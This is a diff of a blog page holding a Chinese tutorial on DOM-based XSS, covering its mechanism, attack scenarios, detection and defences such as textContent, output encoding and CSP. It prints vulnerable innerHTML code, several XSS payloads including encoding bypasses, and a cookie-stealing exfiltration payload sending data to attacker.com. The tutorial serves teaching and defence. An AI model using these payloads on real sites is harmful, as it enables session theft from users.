@@ -60,6 +60,8 @@
 
   
 
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
 
 
 
@@ -149,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -271,25 +273,30 @@
     
     <div class="post-body" itemprop="articleBody"><p>以下是一篇关于<strong>DOM型XSS漏洞</strong>的技术文章，结合漏洞原理、攻击案例、检测方法及防御方案，所有涉及代码的部分均以代码块形式呈现：</p>
 <hr>
-<h3 id="DOM型XSS漏洞：原理、攻击与防御指南"><a href="#DOM型XSS漏洞：原理、攻击与防御指南" class="headerlink" title="DOM型XSS漏洞：原理、攻击与防御指南"></a>DOM型XSS漏洞：原理、攻击与防御指南</h3><p><strong>DOM型XSS（Document Object Model Cross-Site Scripting）</strong> 是一种完全发生在客户端的跨站脚本攻击，恶意代码通过操纵页面的DOM结构触发执行，无需服务器端参与，隐蔽性极强。</p>
+<h3 id="DOM型XSS漏洞：原理、攻击与防御指南">DOM型XSS漏洞：原理、攻击与防御指南</h3>
+<p><strong>DOM型XSS（Document Object Model Cross-Site Scripting）</strong> 是一种完全发生在客户端的跨站脚本攻击，恶意代码通过操纵页面的DOM结构触发执行，无需服务器端参与，隐蔽性极强。</p>
 <hr>
-<h4 id="一、漏洞原理与特点"><a href="#一、漏洞原理与特点" class="headerlink" title="一、漏洞原理与特点"></a>一、漏洞原理与特点</h4><ol>
-<li><p><strong>核心机制</strong><br> 攻击者构造恶意URL，诱导用户访问。客户端JavaScript从URL参数、<code>location.hash</code> 或浏览器存储（如<code>localStorage</code>）中读取数据，通过不安全的DOM操作（如 <code>innerHTML</code>、<code>document.write()</code>）将恶意脚本插入页面并执行。</p>
+<h4 id="一、漏洞原理与特点">一、漏洞原理与特点</h4>
+<ol>
+<li>
+<p><strong>核心机制</strong><br>
+攻击者构造恶意URL，诱导用户访问。客户端JavaScript从URL参数、<code>location.hash</code> 或浏览器存储（如<code>localStorage</code>）中读取数据，通过不安全的DOM操作（如 <code>innerHTML</code>、<code>document.write()</code>）将恶意脚本插入页面并执行。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 漏洞代码示例：直接使用 location.hash 插入DOM</span><br><span class="line">const userContent = window.location.hash.substring(1);</span><br><span class="line">document.getElementById(&#x27;output&#x27;).innerHTML = userContent; // 高危操作！</span><br></pre></td></tr></table></figure>
-
 <p>攻击URL示例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim.com/#&lt;img src=x onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>与传统XSS的区别</strong></p>
+<li>
+<p><strong>与传统XSS的区别</strong></p>
 <table>
 <thead>
 <tr>
 <th><strong>特征</strong></th>
-<th><strong>反射型&#x2F;存储型XSS</strong></th>
+<th><strong>反射型/存储型XSS</strong></th>
 <th><strong>DOM型XSS</strong></th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><strong>攻击位置</strong></td>
 <td>服务器返回恶意脚本</td>
 <td>客户端DOM操作触发</td>
@@ -304,41 +311,51 @@
 <td>查看页面源码可见恶意脚本</td>
 <td>页面源码中不可见</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 </li>
 </ol>
 <hr>
-<h4 id="二、攻击场景与案例"><a href="#二、攻击场景与案例" class="headerlink" title="二、攻击场景与案例"></a>二、攻击场景与案例</h4><ol>
-<li><p><strong>URL参数注入</strong><br> 页面JavaScript直接解析URL参数并动态生成DOM：</p>
+<h4 id="二、攻击场景与案例">二、攻击场景与案例</h4>
+<ol>
+<li>
+<p><strong>URL参数注入</strong><br>
+页面JavaScript直接解析URL参数并动态生成DOM：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 从URL参数获取语言并加载脚本</span><br><span class="line">const lang = new URLSearchParams(location.search).get(&#x27;lang&#x27;);</span><br><span class="line">const script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">script.src = `/static/$&#123;lang&#125;.js`; // 路径拼接漏洞</span><br><span class="line">document.body.appendChild(script);</span><br></pre></td></tr></table></figure>
-
 <p>攻击者构造Payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim.com?lang=attacker&quot;;alert(1);//</span><br></pre></td></tr></table></figure>
-
 <p>实际加载路径变为：<code>/static/attacker&quot;;alert(1);//.js</code>，触发XSS。</p>
 </li>
-<li><p><strong>客户端存储滥用</strong><br> 恶意脚本通过<code>localStorage</code>或<code>sessionStorage</code>持久化：</p>
+<li>
+<p><strong>客户端存储滥用</strong><br>
+恶意脚本通过<code>localStorage</code>或<code>sessionStorage</code>持久化：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 从localStorage读取数据渲染页面</span><br><span class="line">const userData = localStorage.getItem(&#x27;userProfile&#x27;);</span><br><span class="line">document.querySelector(&#x27;.profile&#x27;).innerHTML = userData;</span><br></pre></td></tr></table></figure>
-
 <p>攻击者通过其他漏洞（如反射型XSS）注入恶意数据到<code>localStorage</code>，后续页面加载时触发。</p>
 </li>
-<li><p><strong>数据外带技术</strong><br> 窃取Cookie并发送至攻击者服务器：</p>
+<li>
+<p><strong>数据外带技术</strong><br>
+窃取Cookie并发送至攻击者服务器：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 双通道传输：JSONP + 图片信标</span><br><span class="line">&lt;img src=x onerror=&quot;</span><br><span class="line">  const data = &#123; cookie: document.cookie, dom: document.body.innerHTML &#125;;</span><br><span class="line">  // 通道1：JSONP传输完整数据</span><br><span class="line">  const script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">  script.src = &#x27;https://attacker.com/steal?data=&#x27; + btoa(JSON.stringify(data));</span><br><span class="line">  // 通道2：图片信标备份关键信息</span><br><span class="line">  new Image().src = &#x27;https://attacker.com/log?c=&#x27; + encodeURIComponent(data.cookie);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure>
-
 <p>通过延时触发和随机化传输策略绕过WAF检测。</p>
 </li>
 </ol>
 <hr>
-<h4 id="三、漏洞检测方法"><a href="#三、漏洞检测方法" class="headerlink" title="三、漏洞检测方法"></a>三、漏洞检测方法</h4><ol>
-<li><p><strong>手动测试Payload</strong></p>
+<h4 id="三、漏洞检测方法">三、漏洞检测方法</h4>
+<ol>
+<li>
+<p><strong>手动测试Payload</strong></p>
 <ul>
-<li><p>基础验证：<code>&lt;svg/οnlοad=alert(1)&gt;</code>、<code>&#39;&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</code></p>
+<li>
+<p>基础验证：<code>&lt;svg/οnlοad=alert(1)&gt;</code>、<code>'&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</code></p>
 </li>
-<li><p>编码绕过：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- JS Unicode编码 --&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;</span><br><span class="line">&lt;!-- 拆分字符串 --&gt;</span><br><span class="line">&lt;svg onload=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li>
+<li>
+<p>编码绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- JS Unicode编码 --&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;</span><br><span class="line">&lt;!-- 拆分字符串 --&gt;</span><br><span class="line">&lt;svg onload=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
-<li><p><strong>自动化工具</strong></p>
+<li>
+<p><strong>自动化工具</strong></p>
 <ul>
 <li><strong>OWASP ZAP</strong>：扫描DOM操作中的输入点。</li>
 <li><strong>浏览器开发者工具</strong>：审查DOM结构，跟踪用户输入的数据流。</li>
@@ -346,45 +363,59 @@
 </li>
 </ol>
 <hr>
-<h4 id="四、防御方案"><a href="#四、防御方案" class="headerlink" title="四、防御方案"></a>四、防御方案</h4><ol>
-<li><p><strong>安全的DOM操作</strong></p>
+<h4 id="四、防御方案">四、防御方案</h4>
+<ol>
+<li>
+<p><strong>安全的DOM操作</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 使用 textContent 替代 innerHTML</span><br><span class="line">document.getElementById(&#x27;output&#x27;).textContent = userContent;</span><br><span class="line">// 动态创建元素并设置属性</span><br><span class="line">const div = document.createElement(&#x27;div&#x27;);</span><br><span class="line">div.textContent = userContent; // 安全</span><br><span class="line">document.body.appendChild(div);</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>输入验证与输出编码</strong></p>
+<li>
+<p><strong>输入验证与输出编码</strong></p>
 <ul>
-<li><p>输入侧：白名单校验（如仅允许字母数字）</p>
+<li>
+<p>输入侧：白名单校验（如仅允许字母数字）</p>
 </li>
-<li><p>输出侧：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML实体编码</span><br><span class="line">function encodeHTML(str) &#123;</span><br><span class="line">  return str.replace(/[&amp;&lt;&gt;&quot;&#x27;]/g, m =&gt; `&amp;#$&#123;m.charCodeAt(0)&#125;;`);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>
+<p>输出侧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML实体编码</span><br><span class="line">function encodeHTML(str) &#123;</span><br><span class="line">  return str.replace(/[&amp;&lt;&gt;&quot;&#x27;]/g, m =&gt; `&amp;#$&#123;m.charCodeAt(0)&#125;;`);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
-<li><p><strong>内容安全策略（CSP）</strong><br> 配置HTTP头禁止内联脚本和外部域加载：</p>
+<li>
+<p><strong>内容安全策略（CSP）</strong><br>
+配置HTTP头禁止内联脚本和外部域加载：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>框架安全实践</strong></p>
+<li>
+<p><strong>框架安全实践</strong></p>
 <ul>
-<li><strong>React&#x2F;Vue</strong>：避免使用 <code>dangerouslySetInnerHTML</code> 或 <code>v-html</code>。</li>
+<li><strong>React/Vue</strong>：避免使用 <code>dangerouslySetInnerHTML</code> 或 <code>v-html</code>。</li>
 <li><strong>自动转义</strong>：现代框架默认转义动态内容。</li>
 </ul>
 </li>
 </ol>
 <hr>
-<h4 id="五、企业级防护体系"><a href="#五、企业级防护体系" class="headerlink" title="五、企业级防护体系"></a>五、企业级防护体系</h4><ol>
-<li><strong>SDL流程集成</strong><ul>
+<h4 id="五、企业级防护体系">五、企业级防护体系</h4>
+<ol>
+<li><strong>SDL流程集成</strong>
+<ul>
 <li>需求阶段：识别DOM操作风险点</li>
 <li>代码审查：检查 <code>innerHTML</code>、<code>location</code> 相关操作</li>
-<li>自动化测试：CI&#x2F;CD流水线集成XSS扫描</li>
+<li>自动化测试：CI/CD流水线集成XSS扫描</li>
 </ul>
 </li>
-<li><strong>WAF规则优化</strong><br> 拦截包含<code>javascript:</code>协议、<code>onerror</code>事件等特征的请求。</li>
-<li><strong>监控与应急</strong><ul>
+<li><strong>WAF规则优化</strong><br>
+拦截包含<code>javascript:</code>协议、<code>onerror</code>事件等特征的请求。</li>
+<li><strong>监控与应急</strong>
+<ul>
 <li>实时告警：检测异常数据外带请求（如大量图片信标）</li>
 <li>日志审计：记录所有 <code>localStorage</code> 和 <code>sessionStorage</code> 写入操作</li>
 </ul>
 </li>
 </ol>
 <hr>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>DOM型XSS的本质是<strong>客户端代码对用户输入的无条件信任</strong>。防御需遵循三原则：</p>
+<h3 id="总结">总结</h3>
+<p>DOM型XSS的本质是<strong>客户端代码对用户输入的无条件信任</strong>。防御需遵循三原则：</p>
 <blockquote>
 <ol>
 <li><strong>永不信任客户端输入</strong>：所有来自URL、存储的数据均需验证。</li>
